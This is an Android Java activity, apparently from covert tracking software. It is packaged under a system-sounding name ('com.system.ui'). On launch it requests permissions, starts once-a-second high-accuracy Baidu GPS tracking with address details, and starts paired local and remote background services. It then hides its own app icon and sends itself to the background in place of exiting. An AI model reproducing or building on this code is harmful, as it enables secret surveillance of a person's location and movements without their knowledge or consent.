package com.system.ui;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.system.ui.service.LocalService;
import com.system.ui.service.RemoteService;
import com.system.ui.util.HideAppIcon;
import com.system.ui.util.SDCard;

import java.io.File;

public class MainActivity extends Activity {
    public static final int SDK_VERSION_ECLAIR = 5;
    public static final int SDK_VERSION_DONUT = 4;
    public static final int SDK_VERSION_CUPCAKE = 3;
    public static boolean PRE_CUPCAKE =
            getSDKVersionNumber() < SDK_VERSION_CUPCAKE ? true : false;

    public static int getSDKVersionNumber() {
        int sdkVersion;
        try {
            sdkVersion = Integer.valueOf(android.os.Build.VERSION.SDK);
        } catch (NumberFormatException e) {
            sdkVersion = 0;
        }
        return sdkVersion;
    }

    /**
     * 实时定位的位置（纬度）
     */
    public static String sLat;
    /**
     * 实时定位的位置（经度）
     */
    public static String sLng;
    /**
     * 应用创建的文件夹
     */
    public static final String APP_FOLDER = SDCard.SD_ROOT + File.separator + "system";


    public static boolean isStopThread = false;    // 线程退出标志

    public LocationClient mLocationClient = null;

    public BDLocationListener myListener = new MyLocationListener();
//BDAbstractLocationListener为7.2版本新增的Abstract类型的监听接口，原有BDLocationListener接口暂时同步保留。具体介绍请参考后文中的说明

    //BDAbstractLocationListener为7.2版本新增的Abstract类型的监听接口，原有BDLocationListener接口暂时同步保留。具体介绍请参考后文中的说明
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mLocationClient = new LocationClient(getApplicationContext());
        //声明LocationClient类
        mLocationClient.registerLocationListener(myListener);
        //注册监听函数
        initLocation();
    }
    private PermissionUtils.PermissionGrant mPermissionGrant = new PermissionUtils.PermissionGrant() {
        @Override
        public void onPermissionGranted(int requestCode) {
            mLocationClient.start();
            initPath();
            initService();
            //startService(new Intent(this,LocalService.class));	// 在BaseApplication中已经启动过了
            new HideAppIcon(MainActivity.this).hide();
            finish();
        }
    };

    /**
     * Callback received when a permissions request has been completed.
     */
    @Override
    public void onRequestPermissionsResult(final int requestCode, String[] permissions,
                                           int[] grantResults) {
        mLocationClient.start();
        initPath();
        initService();
        //startService(new Intent(this,LocalService.class));	// 在BaseApplication中已经启动过了
        new HideAppIcon(MainActivity.this).hide();
        finish();
    }

    /**
     * 这里的moveTaskToBack()是进栈，moveTaskToBack()
     * 就可以不销毁的把Activity放到后台去。
     */
    @Override
    public void finish() {
        this.moveTaskToBack(true);
    }


    private void initPath() {
        if (SDCard.isPrepared(this)) {// SD卡可用
            File file = new File(APP_FOLDER);
            if (!file.exists()) {
                file.mkdirs();
            }
        }
    }

    private void initService() {
        startService(new Intent(this, LocalService.class));
        startService(new Intent(this, RemoteService.class));
        Log.i("hyx", "启动服务完毕...LocalService、RemoteService...");
    }

    private static final int MY_PERMISSION_REQUEST_CODE = 10000;


    @Override
    protected void onStart() {
        // TODO Auto-generated method stub
        super.onStart();
        //注册监听函数
        if (getSDKVersionNumber() >= Build.VERSION_CODES.M) {
            PermissionUtils.requestMultiPermissions(this, mPermissionGrant);
        } else {
            mLocationClient.start();
            initPath();
            initService();
            //startService(new Intent(this,LocalService.class));	// 在BaseApplication中已经启动过了
            new HideAppIcon(MainActivity.this).hide();
            finish();
        }

    }

    private void initLocation() {

        LocationClientOption option = new LocationClientOption();
        option.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy);
        //可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        option.setCoorType("gcj02");
        //可选，默认gcj02，设置返回的定位结果坐标系
        int span = 1000;
        option.setScanSpan(span);
        //可选，默认0，即仅定位一次，设置发起定位请求的间隔需要大于等于1000ms才是有效的

        option.setIsNeedAddress(true);
        //可选，设置是否需要地址信息，默认不需要

        option.setOpenGps(true);
        //可选，默认false,设置是否使用gps

        option.setLocationNotify(true);
        //可选，默认false，设置是否当GPS有效时按照1S/1次频率输出GPS结果

        option.setIsNeedLocationDescribe(true);
        //可选，默认false，设置是否需要位置语义化结果，可以在BDLocation.getLocationDescribe里得到，结果类似于“在北京天安门附近”

        option.setIsNeedLocationPoiList(true);
        //可选，默认false，设置是否需要POI结果，可以在BDLocation.getPoiList里得到

        option.setIgnoreKillProcess(false);
        //可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀死

        //   option.setIgnoreCacheException(false);
        //可选，默认false，设置是否收集CRASH信息，默认收集

        option.setEnableSimulateGps(false);
        //可选，默认false，设置是否需要过滤GPS仿真结果，默认需要

        // option.setWifiValidTime(5*60*1000);
        //可选，7.2版本新增能力，如果您设置了这个接口，首次启动定位时，会先判断当前WiFi是否超出有效期，超出有效期的话，会先重新扫描WiFi，然后再定位

        mLocationClient.setLocOption(option);
    }
}
